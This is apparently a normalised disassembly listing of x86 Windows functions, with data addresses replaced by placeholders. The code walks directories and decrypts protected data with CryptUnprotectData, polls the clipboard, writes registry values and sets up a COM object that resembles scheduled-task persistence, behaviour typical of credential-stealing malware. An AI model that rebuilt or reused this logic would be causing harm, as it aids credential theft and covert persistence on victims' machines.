call [ lstrcatW@IAT ]
xor eax eax
push eax
push eax
push eax
push edi
lea eax [ ebp - 0x208 ]
push eax
push 0x70aa0202
push 0x70aa0201
push [ ebp + 0x8 ]
call sub_40541b
test al al
je r-xdata
mov eax esi
call sub_401872
sub_409943
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_41dd6c
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x280
push ebx
push esi
push edi
lea eax [ esp + 0x5c ]
push eax
call sub_401108
xor ebx ebx
mov [ esp + 0x294 ] ebx
mov eax [ ebp + 0x14 ]
push [ eax ]
lea eax [ esp + 0x84 ]
push eax
call [ lstrcpyW@IAT ]
mov esi [ lstrcatW@IAT ]
push r--data
lea eax [ esp + 0x84 ]
push eax
call esi
mov eax [ ebp + 0x10 ]
add eax 0x2c
push eax
mov [ esp + 0x48 ] eax
lea eax [ esp + 0x84 ]
push eax
call esi
push r--data
lea eax [ esp + 0x84 ]
push eax
call esi
mov eax [ ebp + 0x8 ]
xor edi edi
mov [ esp + 0x34 ] edi
mov [ esp + 0x38 ] eax
xor esi esi
lea eax [ esp + 0x80 ]
mov [ esp + 0x2c ] ebx
mov [ esp + 0x30 ] ebx
mov [ esp + 0x3c ] esi
test eax eax
jne r-xdata
push ebx
lea eax [ esp + 0x84 ]
push eax
call sub_4047b2
mov [ esp + 0x10 ] eax
or [ esp + 0x10 ] 0xffffffff
jmp r-xdata
mov [ esp + 0x294 ] 0x1
mov [ esp + 0x28 ] esi
cmp esi ebx
je r-xdata
push ebx
push eax
call [ GetFileSize@IAT ]
push ebx
mov esi eax
push esi
push ebx
push 0x2
push ebx
push [ esp + 0x24 ]
mov [ esp + 0x54 ] esi
call [ CreateFileMappingW@IAT ]
mov [ esp + 0x30 ] eax
cmp eax ebx
je r-xdata
mov eax [ esp + 0x10 ]
mov [ esp + 0x2c ] eax
cmp eax 0xffffffff
je r-xdata
mov [ esp + 0x294 ] bl
cmp edi ebx
je r-xdata
lea eax [ esp + 0x28 ]
push eax
lea eax [ esp + 0x4c ]
push eax
push edi
call sub_409667
add esp 0xc
test al al
je r-xdata
push esi
push ebx
push ebx
push 0x4
push eax
call [ MapViewOfFile@IAT ]
mov [ esp + 0x34 ] eax
mov edi eax
mov esi [ CloseHandle@IAT ]
cmp [ esp + 0x30 ] ebx
je r-xdata
push edi
call [ UnmapViewOfFile@IAT ]
lea eax [ esp + 0x80 ]
push eax
call [ PathRemoveFileSpecW@IAT ]
mov ecx [ ebp + 0x8 ]
push ebx
push sub_4098b7
push ebx
push 0x1
push 0x5
lea edx [ esp + 0x94 ]
call sub_404959
mov esi [ esp + 0x28 ]
shr esi 0x1
cmp esi 0x6400000
ja r-xdata
cmp [ esp + 0x10 ] ebx
je r-xdata
push [ esp + 0x30 ]
call esi
mov [ esp + 0x14 ] ebx
cmp esi ebx
jne r-xdata
or [ esp + 0x294 ] 0xffffffff
lea eax [ esp + 0x5c ]
push eax
call sub_40114f
mov al 0x1
cmp [ esp + 0x10 ] 0xffffffff
je r-xdata
mov ecx [ ebp + 0x8 ]
push r--data
mov ebx r--data
call sub_4010c5
xor ebx ebx
mov [ esp + 0xc ] eax
cmp eax ebx
jne r-xdata
mov [ esp + 0x294 ] bl
cmp edi ebx
je r-xdata
add esi 0x4
cmp [ rw-data ] ebx
jne r-xdata
xor esi esi
inc esi
push [ esp + 0x10 ]
call esi
xor esi esi
xor edi edi
mov [ esp + 0x40 ] ebx
cmp [ esp + 0x28 ] ebx
jbe r-xdata
mov [ esp + 0x294 ] bl
cmp edi ebx
je r-xdata
mov esi [ CloseHandle@IAT ]
cmp [ esp + 0x30 ] ebx
je r-xdata
push edi
call [ UnmapViewOfFile@IAT ]
push ebx
call [ SetLastError@IAT ]
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
cmp eax ebx
jne r-xdata
call sub_405c10
cmp al bl
je r-xdata
mov eax [ ebp + 0x14 ]
push [ eax + 0x4 ]
mov eax [ esp + 0x18 ]
push edi
call sub_4097f1
pop ecx
pop ecx
test al al
je r-xdata
mov eax [ esp + 0x48 ]
add eax esi
push 0x2
push eax
lea eax [ esp + 0x48 ]
push eax
call sub_413290
mov eax [ esp + 0x20 ]
add esp 0xc
add eax edi
push eax
push 0x10
lea eax [ esp + 0x48 ]
push eax
call [ esp + 0x18 ]
add esi 0x2
inc edi
cmp esi [ esp + 0x28 ]
jb r-xdata
mov esi [ CloseHandle@IAT ]
cmp [ esp + 0x30 ] ebx
je r-xdata
push edi
call [ UnmapViewOfFile@IAT ]
cmp [ esp + 0x10 ] ebx
je r-xdata
push [ esp + 0x30 ]
call esi
mov [ esp + 0x14 ] eax
jmp r-xdata
push ebx
call [ ExitProcess@IAT ]
push [ esp + 0x14 ]
call sub_405c44
mov edi [ esp + 0x34 ]
xor ebx ebx
lea esi [ esp + 0x4c ]
call sub_405d11
mov [ esp + 0x294 ] 0x2
push ebx
push [ esp + 0x18 ]
mov ecx esi
push 0x10
pop eax
call sub_4060be
lea esi [ esp + 0x18 ]
call sub_405d11
mov [ esp + 0x294 ] 0x3
cmp [ esp + 0x44 ] ebx
je r-xdata
cmp [ esp + 0x10 ] ebx
je r-xdata
push [ esp + 0x30 ]
call esi
mov bl 0x1
cmp [ esp + 0x10 ] 0xffffffff
je r-xdata
cmp [ esp + 0x14 ] ebx
jne r-xdata
mov [ esp + 0x294 ] 0x2
lea esi [ esp + 0x18 ]
call sub_405f2c
mov [ esp + 0x294 ] 0x1
lea esi [ esp + 0x4c ]
call sub_405f2c
push ebx
lea eax [ esp + 0x10 ]
push eax
push 0x4
pop edi
mov eax edi
mov ecx esi
mov [ esp + 0x14 ] 0x77010101
call sub_4060be
push r--data
mov eax esi
push eax
call sub_4025f0
push ebx
mov eax esi
push eax
call sub_4025f0
push ebx
mov eax esi
push eax
call sub_4025f0
push [ esp + 0x44 ]
mov eax esi
push eax
call sub_4025f0
push ebx
mov eax esi
push eax
call sub_4025f0
push ebx
lea eax [ esp + 0x10 ]
push eax
mov eax edi
mov ecx esi
mov [ esp + 0x14 ] ebx
call sub_4060be
push ebx
lea eax [ esp + 0x10 ]
push eax
mov eax edi
mov ecx esi
mov [ esp + 0x14 ] ebx
call sub_4060be
push ebx
lea eax [ esp + 0x10 ]
push eax
mov eax edi
mov ecx esi
mov [ esp + 0x14 ] ebx
call sub_4060be
call [ GetACP@IAT ]
mov [ esp + 0xc ] eax
push ebx
lea eax [ esp + 0x10 ]
push eax
mov eax edi
mov ecx esi
call sub_4060be
push ebx
lea eax [ esp + 0x10 ]
push eax
mov eax edi
mov ecx esi
mov [ esp + 0x14 ] 0x3
call sub_4060be
mov esi [ esp + 0x50 ]
push ebx
lea eax [ esp + 0x10 ]
push eax
mov eax edi
lea ecx [ esp + 0x20 ]
mov [ esp + 0x14 ] esi
call sub_4060be
cmp esi ebx
jle r-xdata
or [ esp + 0x294 ] 0xffffffff
lea eax [ esp + 0x5c ]
push eax
call sub_40114f
mov al bl
jmp r-xdata
cmp [ esp + 0x10 ] 0xffffffff
je r-xdata
mov ecx [ esp + 0x28c ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
push [ esp + 0x10 ]
call esi
push r--data
lea eax [ esp + 0x1c ]
push eax
call sub_4025f0
mov eax [ esp + 0x1c ]
mov [ esp + 0xc ] eax
lea eax [ esp + 0xc ]
push eax
lea eax [ esp + 0x1c ]
call sub_406173
push [ esp + 0x1c ]
mov esi [ ebp + 0x8 ]
push ebx
push 0x64
push esi
call sub_403aef
push eax
push 0xff0f8211
push [ esp + 0x30 ]
push [ esp + 0x30 ]
call sub_40242d
push ebx
push [ esp + 0x50 ]
mov eax esi
lea ecx [ esp + 0x20 ]
call sub_4060be
push [ esp + 0x10 ]
call esi
jmp r-xdata
sub_409df4
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x664
push ebx
push esi
push edi
xor eax eax
push 0x206
push eax
mov [ esp + 0x18 ] ax
lea eax [ esp + 0x1a ]
push eax
call sub_4130d0
mov edi [ lstrcpyW@IAT ]
add esp 0xc
push [ ebp + 0xc ]
lea eax [ esp + 0x14 ]
push eax
call edi
mov esi [ lstrcatW@IAT ]
push r--data
lea eax [ esp + 0x14 ]
push eax
call esi
mov eax [ ebp + 0x10 ]
add eax 0x2c
push eax
lea eax [ esp + 0x14 ]
push eax
call esi
lea eax [ esp + 0x10 ]
push eax
call [ lstrlenW@IAT ]
push r--data
lea eax [ esp + 0x14 ]
push eax
call esi
mov ebx [ ebp + 0x14 ]
lea eax [ esp + 0x10 ]
mov [ ebx ] eax
test eax eax
je r-xdata
pop edi
pop esi
mov al 0x1
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
cmp eax sub_409943
je r-xdata
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x46c ]
push eax
call edi
lea eax [ esp + 0x10 ]
push eax
call [ GetFileAttributesW@IAT ]
cmp eax 0xffffffff
je r-xdata
lea eax [ esp + 0x218 ]
push eax
lea eax [ esp + 0x46c ]
push eax
call [ FindFirstFileW@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
test al 0x10
je r-xdata
mov esi [ lstrcmpW@IAT ]
push r--data
lea eax [ esp + 0x46c ]
push eax
call esi
push 0x0
call [ Sleep@IAT ]
push r--data
lea eax [ esp + 0x248 ]
push eax
call esi
test eax eax
je r-xdata
test [ esp + 0x218 ] 0x10
je r-xdata
push edi
call [ FindClose@IAT ]
lea eax [ esp + 0x218 ]
push eax
push edi
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
push r--data
lea eax [ esp + 0x248 ]
push eax
call esi
test eax eax
je r-xdata
push ebx
lea eax [ esp + 0x21c ]
push eax
lea eax [ esp + 0x18 ]
push eax
push [ ebp + 0x8 ]
call sub_409943
add esp 0x10
test al al
je r-xdata
sub_409f4f
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_41dde8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x898
and [ esp + 0x8 ] 0x0
push ebx
push esi
push edi
lea esi [ esp + 0x30 ]
call sub_405d11
and [ esp + 0x8ac ] 0x0
mov eax rw-data
mov ebx rw-data
call sub_406f26
xor ecx ecx
mov eax r--data
mov [ esp + 0xc ] 0x200
cmp ecx eax
je r-xdata
xor esi esi
lea ecx [ esp + 0x290 ]
push ecx
push r--data
push eax
push 0x80000001
lea edi [ esp + 0x1c ]
call sub_4068cf
xor esi esi
test al al
je r-xdata
mov edx rw-data
mov ecx ebx
call sub_406e3e
mov bl 0x1
jmp r-xdata
xor eax eax
cmp eax sub_409df4
je r-xdata
mov eax [ esp + 0x14 ]
lea edi [ esp + 0x498 ]
mov [ esp + 0x2c ] eax
call sub_40956d
mov eax edi
test eax eax
je r-xdata
mov eax [ esp + 0xc ]
mov [ esp + 0x18 ] eax
lea eax [ esp + 0x290 ]
mov [ esp + 0x1c ] eax
lea eax [ esp + 0x20 ]
push eax
push esi
push esi
push esi
push esi
push esi
lea eax [ esp + 0x30 ]
push eax
call [ CryptUnprotectData@IAT ]
test eax eax
je r-xdata
push [ esp + 0x14 ]
push [ esp + 0x14 ]
call sub_409799
pop ecx
pop ecx
or [ esp + 0x8ac ] 0xffffffff
lea esi [ esp + 0x30 ]
call sub_405f2c
mov ecx [ esp + 0x8a4 ]
pop edi
pop esi
mov al bl
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov eax edi
push eax
lea eax [ esp + 0x294 ]
push eax
call [ lstrcpyW@IAT ]
mov eax edi
push eax
call [ GetFileAttributesW@IAT ]
cmp eax 0xffffffff
je r-xdata
push 0xf0000000
push 0x18
push esi
push esi
lea eax [ esp + 0x20 ]
push eax
mov [ esp + 0x24 ] esi
call [ CryptAcquireContextW@IAT ]
test eax eax
je r-xdata
lea eax [ esp + 0x40 ]
push eax
lea eax [ esp + 0x294 ]
push eax
call [ FindFirstFileW@IAT ]
mov [ esp + 0xc ] eax
cmp eax 0xffffffff
je r-xdata
test al 0x10
je r-xdata
push [ esp + 0x24 ]
call [ LocalFree@IAT ]
jmp r-xdata
lea eax [ esp + 0x20 ]
push eax
push [ esp + 0x14 ]
lea edx [ esp + 0x6a8 ]
call sub_409593
lea eax [ esp + 0x6a8 ]
push eax
push [ esp + 0x1c ]
lea esi [ esp + 0x24 ]
call sub_409732
add esp 0x10
test al al
jne r-xdata
mov edi [ lstrcmpW@IAT ]
push r--data
lea eax [ esp + 0x294 ]
push eax
call [ lstrcatW@IAT ]
xor esi esi
xor bl bl
push esi
call [ Sleep@IAT ]
push r--data
lea eax [ esp + 0x70 ]
push eax
call edi
test eax eax
je r-xdata
test [ esp + 0x40 ] 0x10
je r-xdata
push [ esp + 0xc ]
call [ FindClose@IAT ]
lea eax [ esp + 0x40 ]
push eax
push [ esp + 0x10 ]
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
push r--data
lea eax [ esp + 0x70 ]
push eax
call edi
test eax eax
je r-xdata
lea eax [ esp + 0x28 ]
push eax
lea eax [ esp + 0x44 ]
push eax
lea eax [ esp + 0x4a0 ]
push eax
push [ ebp + 0x8 ]
call sub_409df4
add esp 0x10
test al al
je r-xdata
sub_40a19d
push ecx
push ecx
push ebx
push ebp
push esi
xor ebp ebp
push edi
xor esi esi
push 0x7530
call [ Sleep@IAT ]
jmp r-xdata
push 0xd
call [ GetClipboardData@IAT ]
mov [ esp + 0x14 ] eax
test eax eax
je r-xdata
call [ GetForegroundWindow@IAT ]
push eax
call [ OpenClipboard@IAT ]
test eax eax
je r-xdata
call [ CloseClipboard@IAT ]
push eax
call [ GlobalLock@IAT ]
mov edi eax
test edi edi
je r-xdata
push [ esp + 0x14 ]
call [ GlobalUnlock@IAT ]
push edi
call [ lstrlenW@IAT ]
mov ebx eax
test ebp ebp
je r-xdata
lea esi [ ebx + ebx ]
push esi
push 0x0
push 0x5f
push [ esp + 0x28 ]
call sub_403aef
push eax
push 0x74447101
push esi
mov esi [ esp + 0x34 ]
push edi
call sub_40242d
push ebp
call sub_405c44
call sub_403fca
mov ebp eax
mov esi ebx
cmp esi ebx
jne r-xdata
push ebp
push edi
call [ lstrcmpW@IAT ]
test eax eax
je r-xdata
sub_40a243
push ebp
mov ebp esp
mov eax 0x2294
call sub_419050
push ebx
push esi
push edi
push r--data
lea eax [ ebp - 0x2290 ]
push eax
call [ lstrcpyW@IAT ]
mov [ ebp - 0x4 ] 0x2080
call sub_4046cc
xor eax eax
mov esi r--data
mov ebx 0x80000001
cmp eax esi
je r-xdata
mov edi [ lstrlenW@IAT ]
lea eax [ ebp - 0x2290 ]
push eax
call edi
lea eax [ eax + eax + 0x2 ]
mov [ ebp - 0x4 ] eax
call sub_4046cc
xor eax eax
cmp eax esi
je r-xdata
lea eax [ ebp - 0x2290 ]
push eax
push r--data
push esi
push ebx
lea edi [ ebp - 0x4 ]
call sub_4068cf
xor al al
jmp r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x2290 ]
push eax
push 0x1
push r--data
push esi
push ebx
call sub_40697b
test al al
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
push [ ebp + 0xc ]
call edi
lea eax [ eax + eax + 0x2 ]
mov [ ebp - 0x4 ] eax
call sub_4046cc
push [ ebp - 0x4 ]
push [ ebp + 0xc ]
push 0x1
push r--data
push esi
push ebx
call sub_40697b
test al al
je r-xdata
push [ ebp + 0x8 ]
call edi
lea eax [ eax + eax + 0x2 ]
mov [ ebp - 0x4 ] eax
call sub_4046cc
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
push 0x1
push r--data
push esi
push ebx
call sub_40697b
test al al
je r-xdata
push 0x3c
lea eax [ ebp - 0x210 ]
push r--data
push eax
call [ wsprintfW@IAT ]
add esp 0xc
lea eax [ ebp - 0x210 ]
push eax
call edi
lea edi [ eax + eax + 0x2 ]
call sub_4046cc
push edi
lea eax [ ebp - 0x210 ]
push eax
push 0x1
push r--data
push esi
push ebx
call sub_40697b
mov al 0x1
sub_40a373
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x214
push ebx
push esi
push edi
mov ebx r--data
push ebx
call sub_4016c1
mov esi [ ebp + 0x8 ]
push eax
push esi
call sub_404e26
mov [ esp + 0x10 ] eax
test eax eax
jne r-xdata
push 0x2
lea eax [ esp + 0x1c ]
push eax
push esi
call sub_403a65
push ebx
lea eax [ esp + 0x1c ]
push eax
call [ lstrcatW@IAT ]
lea eax [ esp + 0x18 ]
push eax
call sub_404c6d
mov edi eax
test edi edi
je r-xdata
call sub_4016c1
mov edi eax
call sub_403fca
mov [ esp + 0x10 ] eax
test eax eax
jne r-xdata
push [ esp + 0x10 ]
call sub_405c44
mov al 0x1
push 0x5f1
push rw-data
push edi
push esi
call sub_404d1a
test al al
je r-xdata
xor al al
jmp r-xdata
push edi
call sub_405c44
push ebx
push edi
push esi
call sub_404e26
mov [ esp + 0x14 ] eax
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_403fca
mov [ esp + 0x14 ] eax
push 0x0
push esi
mov ebx edi
call sub_4048cc
jmp r-xdata
push [ esp + 0x14 ]
push [ esp + 0x14 ]
call sub_40a243
pop ecx
pop ecx
push [ esp + 0x14 ]
call sub_405c44
sub_40a44d
push esi
mov esi [ eax + 0x80 ]
test esi esi
je r-xdata
pop esi
retn
push edi
lea edi [ eax + esi * 4 - 0x4 ]
mov eax [ edi ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub edi 0x4
dec esi
jne r-xdata
pop edi
sub_40a489
mov eax sub_41d8fa
call sub_4198ec
sub esp 0x8f8
push ebx
push esi
push edi
lea eax [ ebp - 0x5c ]
push eax
mov ebx ecx
call [ VariantInit@IAT ]
xor esi esi
mov [ ebp - 0x7c ] esi
mov [ ebp - 0x4 ] esi
lea eax [ ebp - 0x1c ]
push eax
push rw-data
push 0x1
push esi
push rw-data
mov [ ebp - 0x1c ] esi
call [ CoCreateInstance@IAT ]
cmp eax esi
jge r-xdata
mov edx [ ebp - 0x1c ]
lea ecx [ ebp - 0xfc ]
call sub_40a46e
sub esp 0x10
mov edi esp
lea esi [ ebp - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
sub esp 0x10
mov edi esp
lea esi [ ebp - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
sub esp 0x10
mov edi esp
mov eax [ ebp - 0x1c ]
lea esi [ ebp - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx [ eax ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
sub esp 0x10
mov edi esp
lea esi [ ebp - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push eax
movsd [ edi ] [ esi ]
call [ ecx + 0x28 ]
test eax eax
jns r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0x20 ]
push edx
push r--data
push eax
call [ ecx + 0x1c ]
test eax eax
jns r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x7c ]
mov edi eax
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn
mov edx [ ebp - 0x20 ]
lea ecx [ ebp - 0xfc ]
call sub_40a46e
mov eax [ ebp - 0x20 ]
mov ecx [ eax ]
lea edx [ ebp - 0x60 ]
push edx
mov esi r--data
push esi
push eax
call [ ecx + 0x34 ]
test eax eax
js r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x7c ]
mov edi eax
test eax eax
je r-xdata
xor al al
jmp r-xdata
lea esi [ ebp + eax * 4 - 0x100 ]
push r--data
call sub_4016c1
push eax
push [ ebp + 0x8 ]
call sub_404e26
mov [ ebx ] eax
test eax eax
jne r-xdata
mov edx [ ebp - 0x60 ]
lea ecx [ ebp - 0xfc ]
call sub_40a46e
mov eax [ ebp - 0x20 ]
mov ecx [ eax ]
push 0x0
push esi
push eax
call [ ecx + 0x3c ]
test eax eax
jns r-xdata
lea esi [ ebp + eax * 4 - 0x100 ]
mov eax [ esi ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub esi 0x4
dec edi
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0x18 ]
push edx
push 0x0
push eax
call [ ecx + 0x24 ]
test eax eax
jns r-xdata
call sub_4016c1
mov edi eax
call sub_403fca
mov [ ebx ] eax
test eax eax
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x7c ]
mov edi eax
test eax eax
je r-xdata
mov eax [ esi ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub esi 0x4
dec edi
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x18 ]
lea ecx [ ebp - 0xfc ]
call sub_40a46e
mov eax [ ebp - 0x18 ]
mov ecx [ eax ]
lea edx [ ebp - 0x3c ]
push edx
push eax
call [ ecx + 0x24 ]
test eax eax
jns r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x7c ]
mov edi eax
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x7c ]
mov edi eax
test eax eax
je r-xdata
lea esi [ ebp + eax * 4 - 0x100 ]
mov edx [ ebp - 0x3c ]
lea ecx [ ebp - 0xfc ]
call sub_40a46e
mov eax [ ebp - 0x18 ]
mov ecx [ eax ]
lea edx [ ebp - 0x48 ]
push edx
push eax
call [ ecx + 0x44 ]
test eax eax
jns r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x7c ]
mov edi eax
test eax eax
je r-xdata
lea esi [ ebp + eax * 4 - 0x100 ]
lea esi [ ebp + eax * 4 - 0x100 ]
mov eax [ esi ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub esi 0x4
dec edi
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x48 ]
lea ecx [ ebp - 0xfc ]
call sub_40a46e
mov eax [ ebp - 0x18 ]
mov ecx [ eax ]
lea edx [ ebp - 0x2c ]
push edx
push eax
call [ ecx + 0x3c ]
test eax eax
jns r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x7c ]
mov edi eax
test eax eax
je r-xdata
lea esi [ ebp + eax * 4 - 0x100 ]
mov eax [ esi ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub esi 0x4
dec edi
jne r-xdata
jmp r-xdata
mov eax [ esi ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub esi 0x4
dec edi
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x2c ]
lea ecx [ ebp - 0xfc ]
call sub_40a46e
mov eax [ ebp - 0x18 ]
mov ecx [ eax ]
lea edx [ ebp - 0x14 ]
push edx
push eax
call [ ecx + 0x2c ]
test eax eax
jns r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x7c ]
mov edi eax
test eax eax
je r-xdata
lea esi [ ebp + eax * 4 - 0x100 ]
mov eax [ esi ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub esi 0x4
dec edi
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x14 ]
lea ecx [ ebp - 0xfc ]
call sub_40a46e
cmp [ ebp + 0xc ] 0x28
jge r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x7c ]
mov edi eax
test eax eax
je r-xdata
lea esi [ ebp + eax * 4 - 0x100 ]
mov eax [ esi ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub esi 0x4
dec edi
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x48 ]
mov ecx [ eax ]
lea edx [ ebp - 0x44 ]
push edx
push 0x0
push eax
call [ ecx + 0x30 ]
test eax eax
jns r-xdata
mov eax [ ebp - 0x2c ]
mov ecx [ eax ]
push 0x3
push eax
call [ ecx + 0x38 ]
test eax eax
jns r-xdata
lea esi [ ebp + eax * 4 - 0x100 ]
mov eax [ esi ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub esi 0x4
dec edi
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x44 ]
lea ecx [ ebp - 0xfc ]
call sub_40a46e
mov eax [ ebp - 0x44 ]
mov ecx [ eax ]
lea edx [ ebp - 0x34 ]
push edx
push rw-data
push eax
call [ ecx ]
test eax eax
jns r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x7c ]
mov edi eax
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x7c ]
mov edi eax
test eax eax
je r-xdata
mov eax [ esi ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub esi 0x4
dec edi
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x34 ]
lea ecx [ ebp - 0xfc ]
call sub_40a46e
mov eax [ ebp - 0x34 ]
push [ ebx ]
mov ecx [ eax ]
push eax
call [ ecx + 0x2c ]
push 0x3
push [ ebp + 0x8 ]
lea esi [ ebp - 0x104 ]
call sub_4039ef
mov eax [ ebp - 0x34 ]
mov ecx [ eax ]
mov edx esi
push edx
push eax
call [ ecx + 0x34 ]
cmp [ ebp + 0xc ] 0x28
mov eax [ ebp - 0x3c ]
mov ecx [ eax ]
lea edx [ ebp - 0x24 ]
push edx
jl r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x7c ]
mov edi eax
test eax eax
je r-xdata
lea esi [ ebp + eax * 4 - 0x100 ]
lea esi [ ebp + eax * 4 - 0x100 ]
push 0x9
push eax
call [ ecx + 0x28 ]
test eax eax
jns r-xdata
push 0x8
push eax
call [ ecx + 0x28 ]
test eax eax
jns r-xdata
lea esi [ ebp + eax * 4 - 0x100 ]
mov eax [ esi ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub esi 0x4
dec edi
jne r-xdata
jmp r-xdata
mov eax [ esi ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub esi 0x4
dec edi
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x24 ]
lea ecx [ ebp - 0xfc ]
call sub_40a46e
mov eax [ ebp - 0x24 ]
lea edx [ ebp - 0x38 ]
push edx
xor edi edi
push rw-data
mov [ ebp - 0x38 ] edi
mov ecx [ eax ]
push eax
call [ ecx ]
cmp eax edi
jge r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x7c ]
mov edi eax
test eax eax
je r-xdata
mov edx [ ebp - 0x24 ]
lea ecx [ ebp - 0xfc ]
call sub_40a46e
xor edi edi
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x7c ]
mov edi eax
test eax eax
je r-xdata
mov eax [ esi ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub esi 0x4
dec edi
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x38 ]
lea ecx [ ebp - 0xfc ]
call sub_40a46e
lea eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x904 ]
push eax
mov [ ebp - 0x30 ] 0x400
call [ GetUserNameW@IAT ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x7c ]
mov ebx eax
cmp eax edi
je r-xdata
lea esi [ ebp + eax * 4 - 0x100 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
or ebx 0xffffffff
push ebx
push eax
call [ ecx + 0x98 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
push edi
push eax
call [ ecx + 0x50 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
push r--data
push eax
call [ ecx + 0x28 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
push 0x1f4
push eax
call [ ecx + 0x30 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
push r--data
push eax
call [ ecx + 0x70 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
push edi
push eax
call [ ecx + 0x48 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
push edi
push eax
call [ ecx + 0x40 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
lea edx [ ebp - 0x40 ]
push edx
push eax
call [ ecx + 0x9c ]
test eax eax
jns r-xdata
mov eax [ ebp - 0x2c ]
mov ecx [ eax ]
push 0x1
push eax
call [ ecx + 0x48 ]
lea esi [ ebp + eax * 4 - 0x100 ]
cmp [ ebp + 0xc ] 0x28
jl r-xdata
mov eax [ ebp - 0x38 ]
mov ecx [ eax ]
lea edx [ ebp - 0x904 ]
push edx
push eax
call [ ecx + 0x5c ]
cmp eax edi
jge r-xdata
lea esi [ ebp + eax * 4 - 0x100 ]
mov eax [ esi ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub esi 0x4
dec edi
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x40 ]
lea ecx [ ebp - 0xfc ]
call sub_40a46e
mov eax [ ebp - 0x40 ]
mov ecx [ eax ]
push edi
push eax
call [ ecx + 0x30 ]
lea eax [ ebp - 0x74 ]
push eax
call [ VariantInit@IAT ]
push 0x8
push edi
lea eax [ ebp - 0x74 ]
push eax
push eax
call [ VariantChangeType@IAT ]
push r--data
